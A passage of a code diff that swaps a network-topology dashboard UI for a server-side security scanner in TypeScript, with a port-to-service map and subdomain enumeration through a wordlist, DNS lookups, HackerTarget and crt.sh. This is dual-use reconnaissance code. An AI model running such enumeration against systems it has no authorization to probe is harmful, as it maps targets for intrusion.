+          remediation: "Check certificate validity and server configuration."
         });
-    };
+        score += 20;
+      }
 
-    // Pre-calculate layout for a static feel
-    for (let i = 0; i < 300; ++i) simulation.tick();
-    updatePositions();
+      results.vulnerabilities = vulnerabilities;
+      results.riskScore = Math.min(100, score);
+      results.summary = `Scan completed for ${target}. Found ${vulnerabilities.length} potential security issues.`;
+      results.recommendations = vulnerabilities.map(v => v.remediation).slice(0, 5);
 
-    simulation.on('tick', updatePositions);
-
-    function dragstarted(event: any) {
-      if (!event.active) simulation.alphaTarget(0.3).restart();
-      event.subject.fx = event.subject.x;
-      event.subject.fy = event.subject.y;
+    } catch (error) {
+      console.error("[Scanner] Global scan error:", error);
+      results.error = "Scan failed";
     }
 
-    function dragged(event: any) {
-      event.subject.fx = event.x;
-      event.subject.fy = event.y;
+    res.json(results);
+  });
+
+  function getServiceName(port: number) {
+    const services: any = {
+      21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
+      80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
+      465: 'SMTPS', 587: 'SMTP-Submission', 993: 'IMAPS', 995: 'POP3S',
+      1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3000: 'CyberSuite-API', 3306: 'MySQL',
+      3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
+      8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 9000: 'PHP-FPM',
+      9200: 'Elasticsearch', 27017: 'MongoDB'
+    };
+    return services[port] || 'Unknown';
+  }
+
+  // Tool-specific endpoints
+  const scanCache = new Map<string, { data: any, timestamp: number }>();
+  const CACHE_TTL = 1000 * 60 * 5; // 5 minutes
+
+  app.get("/api/tools/:tool", async (req, res) => {
+    const { tool } = req.params;
+    const target = req.query.target as string;
+    if (!target) return res.status(400).json({ error: "Target required" });
+
+    const cacheKey = `${tool}:${target}`;
+    if (scanCache.has(cacheKey)) {
+      const cached = scanCache.get(cacheKey)!;
+      if (Date.now() - cached.timestamp < CACHE_TTL) {
+        console.log(`[Scanner] Returning cached result for ${cacheKey}`);
+        return res.json(cached.data);
+      }
     }
 
-    function dragended(event: any) {
-      if (!event.active) simulation.alphaTarget(0);
-      event.subject.fx = null;
-      event.subject.fy = null;
-    }
+    const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
 
-    // Handle resize
-    const handleResize = () => {
-      const newWidth = containerRef.current?.clientWidth || 800;
-      const newHeight = containerRef.current?.clientHeight || 600;
-      svg.attr('width', newWidth).attr('height', newHeight);
-      simulation.force('center', d3.forceCenter(newWidth / 2, newHeight / 2)).alpha(0.3).restart();
-    };
+    let result: any;
+    switch (tool) {
+      case 'subdomains':
+        if (net.isIP(hostname) || hostname === 'localhost' || hostname === '127.0.0.1') {
+          result = [{ subdomain: hostname, ip: hostname === 'localhost' ? '127.0.0.1' : hostname, status: 'up', type: 'A' }];
+          break;
+        }
 
-    window.addEventListener('resize', handleResize);
+        let searchDomain = hostname;
+        if (searchDomain.startsWith('www.')) {
+          searchDomain = searchDomain.substring(4);
+        }
 
-    return () => {
-      simulation.stop();
-      window.removeEventListener('resize', handleResize);
-    };
-  }, [nodes, zoomLevel, activeAttacks, filter, searchQuery]);
+        const foundSubdomains: any[] = [];
+        const uniqueSubs = new Set<string>();
+        const resolvedSubs = new Set<string>();
 
-  return (
-    <div className={cn(
-      "flex flex-col cyber-card rounded-lg overflow-hidden bg-[#020202] backdrop-blur-sm border border-cyber-border relative",
-      isFullScreen ? "fixed inset-0 z-50 h-screen w-screen rounded-none" : "h-full",
-      "before:content-[''] before:absolute before:inset-0 before:bg-[radial-gradient(circle_at_center,transparent_0%,rgba(0,0,0,0.4)_100%)] before:pointer-events-none before:z-[5]",
-      "after:content-[''] after:absolute after:inset-0 after:bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.1)_50%),linear-gradient(90deg,rgba(255,0,0,0.02),rgba(0,255,0,0.01),rgba(0,0,255,0.02))] after:bg-[length:100%_2px,3px_100%] after:pointer-events-none after:z-[6]"
-    )}>
-      {/* HUD Scan Line */}
-      <div className="absolute inset-0 pointer-events-none z-[7] opacity-10">
-        <div className="w-full h-1 bg-cyber-green/30 blur-[2px] animate-[scan-line_8s_linear_infinite]" />
-      </div>
-
-      <div className="corner-accent corner-tl" />
-      <div className="corner-accent corner-tr" />
-      
-      {/* Header */}
-      <div className="flex flex-col md:flex-row items-center justify-between p-4 gap-4 border-b border-cyber-border bg-cyber-card/40 z-10">
-        <div className="flex items-center gap-3 w-full md:w-auto">
-          <div className="p-2 bg-cyber-green/10 rounded-lg border border-cyber-green/20">
-            <Globe className="w-5 h-5 text-cyber-green" />
-          </div>
-          <div>
-            <h2 className="text-sm font-mono font-bold uppercase tracking-widest text-cyber-header">Network Topology</h2>
-            <div className="flex items-center gap-2">
-              <div className="w-1.5 h-1.5 rounded-full bg-cyber-green animate-pulse" />
-              <span className="text-[10px] font-mono text-cyber-green/60 uppercase">Real-time Monitoring Active</span>
-            </div>
-          </div>
-        </div>
-
-        <div className="flex flex-wrap items-center gap-4 w-full md:w-auto">
-          {/* Search and Filter */}
-          <div className="flex items-center gap-2 bg-black/40 border border-cyber-border rounded-lg px-3 py-1.5 w-full md:w-64">
-            <Search size={14} className="text-cyber-green/50" />
-            <input 
-              type="text" 
-              placeholder="Search nodes..." 
-              value={searchQuery}
-              onChange={(e) => setSearchQuery(e.target.value)}
-              className="bg-transparent border-none focus:outline-none text-xs font-mono text-cyber-green w-full placeholder:text-cyber-green/20"
-            />
-          </div>
-
-          <div className="flex items-center gap-1 bg-black/40 border border-cyber-border rounded-lg p-1">
-            {(['all', 'compromised', 'vulnerable'] as const).map((f) => (
-              <button
-                key={f}
-                onClick={() => setFilter(f)}
-                className={cn(
-                  "px-2 py-1 rounded text-[9px] font-mono uppercase transition-all",
-                  filter === f ? "bg-cyber-green/20 text-cyber-green" : "text-cyber-text/40 hover:text-cyber-text/80"
-                )}
-              >
-                {f}
-              </button>
-            ))}
-          </div>
-
-          <div className="hidden lg:flex gap-4 border-l border-cyber-border pl-4">
-            <div className="flex flex-col items-end">
-              <span className="text-[8px] font-mono text-cyber-text/60 uppercase">Traffic</span>
-              <span className="text-xs font-mono text-cyber-green">{stats.traffic}</span>
-            </div>
-            <div className="flex flex-col items-end">
-              <span className="text-[8px] font-mono text-cyber-text/60 uppercase">Latency</span>
-              <span className="text-xs font-mono text-cyan-400">{stats.avgLatency}</span>
-            </div>
-            <div className="flex flex-col items-end">
-              <span className="text-[8px] font-mono text-red-500 uppercase">Breaches</span>
-              <span className="text-xs font-mono text-red-500">{stats.compromised}</span>
-            </div>
-          </div>
-          
-          <div className="flex gap-2 ml-auto">
-            <button 
-              onClick={handleScan}
-              disabled={isScanning}
-              className={cn(
-                "p-2 rounded-lg border transition-all flex items-center gap-2",
-                isScanning 
-                  ? "bg-cyber-green/20 border-cyber-green/40 text-cyber-green" 
-                  : "bg-cyber-card/5 border-cyber-border text-cyber-text/60 hover:text-cyber-header hover:bg-cyber-card/10"
-              )}
-            >
-              <Zap size={14} className={isScanning ? "animate-pulse" : ""} />
-              <span className="text-[10px] font-mono uppercase hidden sm:inline">Deep Scan</span>
-            </button>
-            <button 
-              onClick={fetchNetworkData}
-              className="p-2 bg-cyber-card/5 border border-cyber-border rounded-lg text-cyber-text/60 hover:text-cyber-header hover:bg-cyber-card/10 transition-all"
-            >
-              <RefreshCw size={14} />
-            </button>
-          </div>
-        </div>
-      </div>
-
-      {/* Main Visualization Area */}
-      <div 
-        ref={containerRef} 
-        className={cn(
-          "flex-1 relative overflow-hidden transition-colors duration-1000",
-          stats.compromised > 0 
-            ? "bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-red-900/20 via-black to-black" 
-            : "bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-cyan-900/10 via-black to-black"
-        )}
-      >
-        {/* Grid Background */}
-        <div className="absolute inset-0 bg-[linear-gradient(to_right,#06b6d415_1px,transparent_1px),linear-gradient(to_bottom,#06b6d415_1px,transparent_1px)] bg-[size:40px_40px] [mask-image:radial-gradient(ellipse_80%_80%_at_50%_50%,#000_20%,transparent_100%)] pointer-events-none" />
+        // 1. Common subdomains dictionary
+        const commonSubs = [
+          'www', 'mail', 'dev', 'api', 'staging', 'blog', 'vpn', 'ns1', 'ns2', 'mx',
+          'shop', 'store', 'app', 'portal', 'admin', 'test', 'demo', 'support', 'help',
+          'docs', 'beta', 'static', 'assets', 'img', 'cdn', 'cloud', 'remote', 'secure',
+          'login', 'auth', 'account', 'profile', 'dashboard', 'internal', 'corp', 'staff',
+          'ftp', 'smtp', 'pop', 'imap', 'webmail', 'autodiscover', 'cpanel', 'whm', 'webdisk',
+          'm', 'mobile', 'news', 'forum', 'client', 'clients', 'billing', 'panel', 'manage',
+          'git', 'svn', 'dev-api', 'api-dev', 'test-api', 'api-test', 'v1', 'v2', 'v3',
+          'status', 'monitor', 'monitoring', 'zabbix', 'nagios', 'grafana', 'prometheus',
+          'jenkins', 'gitlab', 'docker', 'registry', 'k8s', 'kubernetes', 'cluster',
+          'db', 'database', 'sql', 'mysql', 'postgres', 'redis', 'elastic', 'mongo',
+          'search', 'files', 'upload', 'download', 'media', 'images', 'videos', 'assets1', 'assets2',
+          'dev1', 'dev2', 'dev3', 'qa', 'uat', 'prod', 'production', 'sandbox', 'preprod',
+          'api1', 'api2', 'api3', 'web', 'web1', 'web2', 'web3', 'app1', 'app2', 'app3',
+          'mail1', 'mail2', 'mail3', 'smtp1', 'smtp2', 'smtp3', 'pop1', 'pop2', 'pop3',
+          'imap1', 'imap2', 'imap3', 'ftp1', 'ftp2', 'ftp3', 'ssh', 'vpn1', 'vpn2', 'vpn3',
+          'proxy', 'proxy1', 'proxy2', 'proxy3', 'loadbalancer', 'lb', 'gateway', 'gw',
+          'firewall', 'fw', 'router', 'switch', 'hub', 'bridge', 'dns1', 'dns2', 'dns3',
+          'ns', 'ns3', 'ns4', 'mx1', 'mx2', 'mx3', 'txt', 'spf', 'dkim', 'dmarc',
+          'devops', 'sysadmin', 'root', 'super', 'manager', 'owner', 'user', 'users',
+          'customer', 'customers', 'partner', 'partners', 'vendor', 'vendors', 'supplier',
+          'suppliers', 'employee', 'employees', 'hr', 'finance', 'accounting', 'legal',
+          'marketing', 'sales', 'support1', 'support2', 'helpdesk', 'service', 'services',
+          'api-gateway', 'gateway-api', 'microservice', 'microservices', 'service1', 'service2',
+          'node1', 'node2', 'node3', 'server1', 'server2', 'server3', 'host1', 'host2', 'host3'
+        ];
         
-        {isLoading && (
-          <div className="absolute inset-0 flex items-center justify-center bg-cyber-bg/60 backdrop-blur-sm z-20">
-            <div className="flex flex-col items-center gap-4">
-              <div className="relative">
-                <div className="w-16 h-16 border-2 border-cyan-500/20 rounded-full" />
-                <div className="absolute inset-0 w-16 h-16 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" />
-                <Globe className="absolute inset-0 m-auto w-6 h-6 text-cyan-400 animate-pulse" />
-              </div>
-              <div className="flex flex-col items-center">
-                <span className="text-xs font-mono text-cyan-400 tracking-[0.2em] uppercase">Initializing Neural Map</span>
-                <span className="text-[10px] font-mono text-cyan-500/40 mt-1">Mapping network interfaces...</span>
-              </div>
-            </div>
-          </div>
-        )}
+        const dictionarySubs = commonSubs.map(sub => `${sub}.${searchDomain}`);
+        dictionarySubs.push(searchDomain);
 
-        {isScanning && (
-          <div className="absolute inset-0 pointer-events-none z-10 overflow-hidden">
-            <div className="absolute inset-0 bg-cyan-500/5 animate-pulse" />
-            <motion.div 
-              initial={{ top: '-10%' }}
-              animate={{ top: '110%' }}
-              transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
-              className="absolute left-0 right-0 h-1 bg-cyan-400 shadow-[0_0_20px_rgba(34,211,238,0.8)] z-20"
-            />
-            <div className="absolute inset-0 flex items-center justify-center">
-              <div className="w-[80%] h-[80%] border border-cyan-500/20 rounded-full animate-[ping_3s_linear_infinite]" />
-            </div>
-            <div className="absolute top-4 left-1/2 -translate-x-1/2 px-4 py-1 bg-cyan-500/20 border border-cyan-500/40 rounded-full backdrop-blur-md shadow-[0_0_15px_rgba(34,211,238,0.3)]">
-              <span className="text-[10px] font-mono text-cyan-400 animate-pulse uppercase tracking-widest">Active Deep Scan in Progress...</span>
-            </div>
-          </div>
-        )}
-
-        <svg 
-          ref={svgRef} 
-          className="w-full h-full"
-          onClick={() => setSelectedNode(null)}
-        />
-
-        {/* Zoom Controls */}
-        <div className="absolute bottom-6 left-6 flex flex-col gap-2 z-10">
-          <button 
-            onClick={() => {
-              if (svgRef.current && zoomRef.current) {
-                d3.select(svgRef.current).transition().duration(500).call(zoomRef.current.scaleBy as any, 1.5);
+        // 2. Start resolving dictionary subdomains immediately
+        const resolveBatch = async (subs: string[]) => {
+          const limit = pLimit(10); // Limit to 10 concurrent lookups
+          await Promise.all(subs.map(domain => limit(async () => {
+            if (resolvedSubs.has(domain)) return;
+            try {
+              // Add a 2s timeout for each DNS lookup to prevent hanging
+              const lookup = await Promise.race([
+                dns.promises.lookup(domain),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
+              ]) as any;
+              
+              if (lookup && lookup.address) {
+                foundSubdomains.push({ 
+                  subdomain: domain, 
+                  ip: lookup.address, 
+                  status: 'up', 
+                  type: lookup.family === 6 ? 'AAAA' : 'A',
+                  last_seen: new Date().toISOString()
+                });
               }
-            }}
-            className="p-2 bg-cyber-card/60 border border-cyber-border rounded-lg text-cyber-text/60 hover:text-cyber-header hover:bg-cyber-card/80 transition-all shadow-xl"
-            title="Zoom In"
-          >
-            <ZoomIn size={16} />
-          </button>
-          <button 
-            onClick={() => {
-              if (svgRef.current && zoomRef.current) {
-                d3.select(svgRef.current).transition().duration(500).call(zoomRef.current.scaleBy as any, 0.667);
+            } catch (e) {}
+            resolvedSubs.add(domain);
+          })));
+        };
+
+        // 3. Start crt.sh fetch, HackerTarget fetch, and dictionary resolution in parallel
+        console.log(`[Scanner] Starting parallel subdomain discovery for ${searchDomain}...`);
+        
+        const hackerTargetPromise = (async () => {
+          try {
+            const htUrl = `https://api.hackertarget.com/hostsearch/?q=${searchDomain}`;
+            const response = await axios.get(htUrl, { timeout: 8000 });
+            if (response.status === 200 && typeof response.data === 'string') {
+              const lines = response.data.split('\n');
+              const newSubs = new Set<string>();
+              lines.forEach(line => {
+                const parts = line.split(',');
+                if (parts[0] && parts[0].endsWith(searchDomain)) {
+                  newSubs.add(parts[0].toLowerCase());
+                }
+              });
+              if (newSubs.size > 0) {
+                console.log(`[Scanner] HackerTarget found ${newSubs.size} unique subdomains, resolving...`);
+                await resolveBatch(Array.from(newSubs));
               }
-            }}
-            className="p-2 bg-cyber-card/60 border border-cyber-border rounded-lg text-cyber-text/60 hover:text-cyber-header hover:bg-cyber-card/80 transition-all shadow-xl"
-            title="Zoom Out"
-          >
-            <ZoomOut size={16} />
-          </button>
-          <button 
-            onClick={() => setIsFullScreen(!isFullScreen)}
-            className="p-2 bg-cyber-card/60 border border-cyber-border rounded-lg text-cyber-text/60 hover:text-cyber-header hover:bg-cyber-card/80 transition-all shadow-xl mt-2"
-            title={isFullScreen ? "Exit Full Screen" : "Full Screen"}
-          >
-            {isFullScreen ? <Minimize2 size={16} /> : <Maximize2 size={16} />}
-          </button>
-        </div>
+            }
+          } catch (e: any) {
+            console.warn(`[Scanner] HackerTarget fetch skipped/failed (${e.message}).`);
+          }
+        })();
 
-        {/* Full Screen Close Button */}
-        {isFullScreen && (
-          <button 
-            onClick={() => setIsFullScreen(false)}
-            className="absolute top-4 right-4 z-50 p-3 bg-red-500/20 backdrop-blur-md border border-red-500/50 rounded-full text-red-500 hover:bg-red-500 hover:text-white transition-all shadow-[0_0_20px_rgba(239,68,68,0.4)]"
-            title="Close Full Screen"
-          >
-            <X size={24} />
-          </button>
-        )}
+        const crtShPromise = (async () => {
+          try {
+            const crtUrl = `https://crt.sh/?q=%.${searchDomain}&output=json`;
+            const response = await axios.get(crtUrl, {
+              timeout: 10000, // Reduced to 10s to prevent long hangs
+              headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+              },
+              validateStatus: () => true
+            });
 
-        {/* Legend */}
-        <div className="absolute bottom-6 right-6 p-4 bg-cyber-card/60 border border-cyber-border rounded-xl backdrop-blur-md z-10 shadow-xl">
-          <h4 className="text-[10px] font-mono text-cyber-text/60 uppercase mb-3 tracking-widest">Node Status</h4>
-          <div className="space-y-2">
-            <div className="flex items-center gap-3">
-              <div className="w-2 h-2 rounded-full bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]" />
-              <span className="text-[10px] font-mono text-cyber-text uppercase">Secure</span>
-            </div>
-            <div className="flex items-center gap-3">
-              <div className="w-2 h-2 rounded-full bg-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.5)]" />
-              <span className="text-[10px] font-mono text-cyber-text uppercase">Vulnerable</span>
-            </div>
-            <div className="flex items-center gap-3">
-              <div className="w-2 h-2 rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)] animate-pulse" />
-              <span className="text-[10px] font-mono text-cyber-text uppercase">Compromised</span>
-            </div>
-          </div>
-        </div>
-
-        {/* Legend */}
-        <div className="absolute bottom-6 left-6 p-4 bg-black/60 border border-cyber-border rounded-xl backdrop-blur-md z-20">
-          <h4 className="text-[10px] font-mono text-cyber-header uppercase mb-3 tracking-widest">Node Status</h4>
-          <div className="space-y-2">
-            <div className="flex items-center gap-2">
-              <div className="w-2 h-2 rounded-full bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]" />
-              <span className="text-[9px] font-mono text-cyber-text/60 uppercase tracking-wider">Secure</span>
-            </div>
-            <div className="flex items-center gap-2">
-              <div className="w-2 h-2 rounded-full bg-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.5)]" />
-              <span className="text-[9px] font-mono text-cyber-text/60 uppercase tracking-wider">Vulnerable</span>
-            </div>
-            <div className="flex items-center gap-2">
-              <div className="w-2 h-2 rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)] animate-pulse" />
-              <span className="text-[9px] font-mono text-cyber-text/60 uppercase tracking-wider">Compromised</span>
-            </div>
-          </div>
-        </div>
-
-        {/* Zoom Controls */}
-        <div className="absolute bottom-6 right-6 flex flex-col gap-2 z-20">
-          <button 
-            onClick={() => zoomRef.current && d3.select(svgRef.current!).transition().call(zoomRef.current.scaleBy, 1.3)}
-            className="p-2 bg-black/60 border border-cyber-border rounded-lg text-cyber-text/60 hover:text-cyber-header hover:bg-cyber-card/10 transition-all"
-          >
-            <Plus size={16} />
-          </button>
-          <button 
-            onClick={() => zoomRef.current && d3.select(svgRef.current!).transition().call(zoomRef.current.scaleBy, 0.7)}
-            className="p-2 bg-black/60 border border-cyber-border rounded-lg text-cyber-text/60 hover:text-cyber-header hover:bg-cyber-card/10 transition-all"
-          >
-            <Minus size={16} />
-          </button>
-          <button 
-            onClick={() => zoomRef.current && d3.select(svgRef.current!).transition().call(zoomRef.current.transform, d3.zoomIdentity)}
-            className="p-2 bg-black/60 border border-cyber-border rounded-lg text-cyber-text/60 hover:text-cyber-header hover:bg-cyber-card/10 transition-all"
-          >
-            <Maximize size={16} />
-          </button>
-        </div>
-
-        {/* Network Health Dashboard */}
-        <div className="absolute top-6 left-6 flex flex-col gap-4 z-20">
-          <div className="p-4 bg-black/60 border border-cyber-border rounded-xl backdrop-blur-md w-48">
-            <div className="flex items-center justify-between mb-2">
-              <span className="text-[9px] font-mono text-cyber-text/60 uppercase">Network Health</span>
-              <span className="text-[10px] font-mono text-cyber-green">94%</span>
-            </div>
-            <div className="h-1.5 bg-white/5 rounded-full overflow-hidden mb-4">
-              <div className="h-full bg-cyber-green w-[94%] shadow-[0_0_10px_rgba(16,185,129,0.3)]" />
-            </div>
-            <div className="grid grid-cols-2 gap-2">
-              <div className="flex flex-col">
-                <span className="text-[8px] font-mono text-cyber-text/40 uppercase">Nodes</span>
-                <span className="text-xs font-mono text-cyber-header">{stats.totalNodes}</span>
-              </div>
-              <div className="flex flex-col">
-                <span className="text-[8px] font-mono text-cyber-text/40 uppercase">Uptime</span>
-                <span className="text-xs font-mono text-cyan-400">{stats.uptime}</span>
-              </div>
-            </div>
-          </div>
-          
-          <div className="p-3 bg-black/60 border border-cyber-border rounded-xl backdrop-blur-md flex items-center gap-3">
-            <div className="p-2 bg-red-500/10 rounded-lg border border-red-500/20">
-              <AlertTriangle size={14} className="text-red-500" />
-            </div>
-            <div>
-              <span className="text-[8px] font-mono text-cyber-text/40 uppercase block">Active Threats</span>
-              <span className="text-xs font-mono text-red-500">{stats.compromised} Detected</span>
-            </div>
-          </div>
-        </div>
-
-        {/* MiniMap Placeholder (Visual only for now) */}
-        <div className="absolute top-6 left-56 w-32 h-32 bg-black/40 border border-cyber-border rounded-xl backdrop-blur-sm z-10 hidden xl:block overflow-hidden">
-          <div className="absolute inset-0 opacity-20">
-            <div className="w-full h-full border border-cyber-green/20 grid grid-cols-4 grid-rows-4">
-              {Array.from({ length: 16 }).map((_, i) => (
-                <div key={i} className="border-[0.5px] border-cyber-green/10" />
-              ))}
-            </div>
-          </div>
-          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-2 h-2 bg-cyber-green rounded-full animate-ping" />
-          <div className="absolute bottom-1 left-1 text-[7px] font-mono text-cyber-green/40 uppercase">Sector 7G</div>
-        </div>
-
-        {/* Detail Panel */}
-        <AnimatePresence>
-          {selectedNode && (
-            <motion.div 
-              initial={{ opacity: 0, x: 50 }}
-              animate={{ opacity: 1, x: 0 }}
-              exit={{ opacity: 0, x: 50 }}
-              className="absolute top-6 right-6 w-80 bg-black/90 border border-cyber-border rounded-2xl backdrop-blur-2xl z-30 shadow-[0_0_50px_rgba(0,0,0,0.5)] overflow-hidden"
-            >
-              {/* Panel Header */}
-              <div className={cn(
-                "p-4 flex items-center justify-between border-b relative overflow-hidden",
-                selectedNode.status === 'secure' ? "bg-emerald-500/10 border-emerald-500/20" :
-                selectedNode.status === 'vulnerable' ? "bg-amber-500/10 border-amber-500/20" :
-                "bg-red-500/10 border-red-500/20"
-              )}>
-                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent animate-[shimmer_2s_infinite]" />
-                <div className="flex items-center gap-3 relative z-10">
-                  <div className={cn(
-                    "p-2 rounded-lg shadow-lg",
-                    selectedNode.status === 'secure' ? "bg-emerald-500/20 text-emerald-400" :
-                    selectedNode.status === 'vulnerable' ? "bg-amber-500/20 text-amber-400" :
-                    "bg-red-500/20 text-red-400"
-                  )}>
-                    {selectedNode.type === 'server' ? <Server size={18} /> :
-                     selectedNode.type === 'router' ? <Router size={18} /> :
-                     selectedNode.type === 'firewall' ? <Shield size={18} /> :
-                     selectedNode.type === 'database' ? <Database size={18} /> :
-                     selectedNode.type === 'cloud' ? <Globe size={18} /> :
-                     selectedNode.type === 'iot' ? <Cpu size={18} /> :
-                     <Laptop size={18} />}
-                  </div>
-                  <div>
-                    <h3 className="text-sm font-mono font-bold text-cyber-header uppercase tracking-tight">{selectedNode.label}</h3>
-                    <span className="text-[10px] font-mono text-cyber-text/60">{selectedNode.ip}</span>
-                  </div>
-                </div>
-                <button 
-                  onClick={() => setSelectedNode(null)}
-                  className="p-1 text-cyber-text/60 hover:text-cyber-header transition-colors relative z-10"
-                >
-                  <X size={20} />
-                </button>
-              </div>
-
-              {/* Panel Content */}
-              <div className="p-5 space-y-6">
-                {/* Resource Usage */}
-                <div className="space-y-4">
-                  <div className="space-y-1.5">
-                    <div className="flex justify-between text-[9px] font-mono uppercase">
-                      <span className="text-cyber-text/60">CPU Load</span>
-                      <span className="text-cyber-header">{selectedNode.cpuUsage}%</span>
-                    </div>
-                    <div className="h-1 bg-white/5 rounded-full overflow-hidden">
-                      <motion.div 
-                        initial={{ width: 0 }}
-                        animate={{ width: `${selectedNode.cpuUsage}%` }}
-                        className={cn(
-                          "h-full rounded-full",
-                          selectedNode.cpuUsage! > 80 ? "bg-red-500" : selectedNode.cpuUsage! > 50 ? "bg-amber-500" : "bg-cyber-green"
-                        )}
-                      />
-                    </div>
-                  </div>
-                  <div className="space-y-1.5">
-                    <div className="flex justify-between text-[9px] font-mono uppercase">
-                      <span className="text-cyber-text/60">Memory Usage</span>
-                      <span className="text-cyber-header">{selectedNode.memUsage}%</span>
-                    </div>
-                    <div className="h-1 bg-white/5 rounded-full overflow-hidden">
-                      <motion.div 
-                        initial={{ width: 0 }}
-                        animate={{ width: `${selectedNode.memUsage}%` }}
-                        className={cn(
-                          "h-full rounded-full",
-                          selectedNode.memUsage! > 80 ? "bg-red-500" : selectedNode.memUsage! > 50 ? "bg-amber-500" : "bg-cyan-500"
-                        )}
-                      />
-                    </div>
-                  </div>
-                </div>
-
-                {/* Metrics Grid */}
-                <div className="grid grid-cols-2 gap-4">
-                  <div className="p-3 bg-white/5 border border-white/10 rounded-xl">
-                    <div className="flex items-center gap-2 mb-1">
-                      <Activity size={12} className="text-cyber-green" />
-                      <span className="text-[9px] font-mono text-cyber-text/60 uppercase">Traffic</span>
-                    </div>
-                    <span className="text-sm font-mono text-cyber-header">{selectedNode.traffic}%</span>
-                  </div>
-                  <div className="p-3 bg-white/5 border border-white/10 rounded-xl">
-                    <div className="flex items-center gap-2 mb-1">
-                      <Shield size={12} className={cn(
-                        selectedNode.threatLevel! > 70 ? "text-red-500" : "text-emerald-500"
-                      )} />
-                      <span className="text-[9px] font-mono text-cyber-text/60 uppercase">Threat</span>
-                    </div>
-                    <span className="text-sm font-mono text-cyber-header">{selectedNode.threatLevel}%</span>
-                  </div>
-                </div>
-
-                {/* System Info */}
-                <div className="space-y-3 p-4 bg-white/5 border border-white/10 rounded-xl">
-                  <div className="flex justify-between items-center text-[10px] font-mono">
-                    <span className="text-cyber-text/60 uppercase">Operating System</span>
-                    <span className="text-cyber-header">{selectedNode.os}</span>
-                  </div>
-                  <div className="flex justify-between items-center text-[10px] font-mono">
-                    <span className="text-cyber-text/60 uppercase">System Uptime</span>
-                    <span className="text-cyber-header">{selectedNode.uptime}</span>
-                  </div>
-                  <div className="flex justify-between items-center text-[10px] font-mono">
-                    <span className="text-cyber-text/60 uppercase">Last Seen</span>
-                    <span className="text-cyber-header">{selectedNode.lastSeen}</span>
-                  </div>
-                  <div className="flex justify-between items-center text-[10px] font-mono">
-                    <span className="text-cyber-text/60 uppercase">Status</span>
-                    <span className={cn(
-                      "px-2 py-0.5 rounded-full text-[8px] font-bold uppercase",
-                      selectedNode.status === 'secure' ? "bg-emerald-500/20 text-emerald-400" :
-                      selectedNode.status === 'vulnerable' ? "bg-amber-500/20 text-amber-400" :
-                      "bg-red-500/20 text-red-400"
-                    )}>
-                      {selectedNode.status}
-                    </span>
-                  </div>
-                </div>
-
-                {/* Analysis Box */}
-                <div className="p-4 bg-cyan-500/5 border border-cyan-500/20 rounded-xl space-y-2">
-                  <div className="flex items-center gap-2">
-                    <Info size={14} className="text-cyan-400" />
-                    <span className="text-[10px] font-mono text-white uppercase tracking-widest">Core Analysis</span>
-                  </div>
-                  <p className="text-[10px] text-gray-400 leading-relaxed font-sans italic">
-                    {selectedNode.status === 'secure' ? 
-                      'Node integrity verified. All cryptographic signatures match. Traffic patterns are consistent with baseline behavior.' :
-                      selectedNode.status === 'vulnerable' ?
-                      'Potential entry point detected. Outdated software versions found. Immediate patching recommended to prevent lateral movement.' :
-                      'ACTIVE BREACH DETECTED. Unauthorized access in progress. System isolation required to prevent data exfiltration.'
+            if (response.status === 200 && response.data) {
+              const certs = response.data;
+              if (Array.isArray(certs)) {
+                const newSubs = new Set<string>();
+                certs.forEach((cert: any) => {
+                  const nameValue = cert.name_value.toLowerCase();
+                  nameValue.split('\n').forEach((sub: string) => {
+                    const cleanSub = sub.trim();
+                    if (cleanSub && !cleanSub.includes('*') && cleanSub.endsWith(searchDomain) && !resolvedSubs.has(cleanSub)) {
+                      newSubs.add(cleanSub);
                     }
-                  </p>
-                </div>
+                  });
+                });
+                
+                if (newSubs.size > 0) {
+                  console.log(`[Scanner] crt.sh found ${newSubs.size} unique subdomains, resolving...`);
+                  await resolveBatch(Array.from(newSubs));
+                }
+              }
+            }
+          } catch (e: any) {
+            // Suppress crt.sh timeout/failure warnings to reduce log noise
+          }
+        })();
 
-                {/* Actions */}
-                <div className="grid grid-cols-2 gap-3">
-                  <button 
-                    onClick={() => handleNodeAction('isolate')}
-                    className="flex items-center justify-center gap-2 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl text-[10px] font-mono text-white transition-all group"
-                  >
-                    <Lock size={12} className="text-gray-500 group-hover:text-white" />
-                    ISOLATE
-                  </button>
-                  <button 
-                    onClick={() => handleNodeAction(selectedNode.status === 'secure' ? 'scan' : 'remediate')}
-                    className="flex items-center justify-center gap-2 py-3 bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 rounded-xl text-[10px] font-mono text-cyan-400 transition-all"
-                  >
-                    {selectedNode.status === 'secure' ? <Search size={12} /> : <Zap size={12} />}
-                    {selectedNode.status === 'secure' ? 'DEEP SCAN' : 'REMEDIATE'}
-                  </button>
-                </div>
-              </div>
-            </motion.div>
-          )}
-        </AnimatePresence>
-      </div>
-    </div>
-  );
+        // Run all discovery methods in parallel
+        await Promise.all([
+          resolveBatch(dictionarySubs),
+          hackerTargetPromise,
+          crtShPromise
+        ]);
+
+        if (foundSubdomains.length === 0) {
